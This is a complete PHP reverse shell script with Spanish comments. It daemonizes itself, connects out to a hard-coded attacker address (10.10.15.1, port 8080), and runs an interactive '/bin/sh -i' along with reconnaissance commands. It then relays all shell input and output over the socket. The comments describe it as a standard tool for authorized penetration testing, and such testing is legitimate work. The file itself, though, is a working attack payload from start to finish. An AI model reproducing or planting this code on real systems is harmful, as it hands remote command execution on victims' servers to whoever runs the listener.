<?php

// Script Reverse Shell en PHP
// ---------------------------
// Este script abre una conexión TCP saliente a una IP y puerto específicos,
// y ejecuta un shell interactivo para controlar remotamente la máquina.
// Es típico en pentesting para obtener acceso remoto autorizado.

// Configuración inicial
set_time_limit(0);  // Sin límite de tiempo de ejecución
$VERSION = "1.0";
$ip = '10.10.15.1';  // Cambia aquí por tu IP atacante
$port = 8080;        // Cambia aquí por tu puerto de escucha
$chunk_size = 1400;  // Tamaño del buffer para leer/escribir datos
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i'; // Comandos iniciales + shell interactiva
$daemon = 0;  // Indica si el proceso está daemonizado
$debug = 0;   // Modo debug apagado

// Intento de daemonizar el proceso para que corra en segundo plano
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();

    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }

    if ($pid) {
        exit(0);  // Proceso padre termina
    }

    // El hijo se convierte en líder de sesión para evitar zombies
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise. This is common and non-fatal.");
}

// Cambia al directorio raíz para evitar problemas de path
chdir("/");

// Elimina restricciones de permisos heredadas
umask(0);

// Abre una conexión TCP saliente al atacante
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Define pipes para stdin, stdout y stderr del shell
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin
   1 => array("pipe", "w"),  // stdout
   2 => array("pipe", "w")   // stderr
);

// Ejecuta el shell con los pipes definidos
$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Configura todos los streams en modo no bloqueante
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

// Loop principal que transmite datos entre la conexión y el shell
while (1) {
    // Detecta si la conexión o el shell terminaron
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    // Espera hasta que haya datos disponibles para leer
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // Si hay comandos entrantes desde el socket, envíalos al shell
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }

    // Si el shell produjo salida estándar, envíala de vuelta al socket
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }

    // Si el shell produjo salida de error, envíala de vuelta al socket
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

// Cierra todas las conexiones y el proceso shell al terminar
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Función para imprimir mensajes solo si no está daemonizado
function printit ($string) {
    global $daemon;
    if (!$daemon) {
        print "$string\n";
    }
}

?>
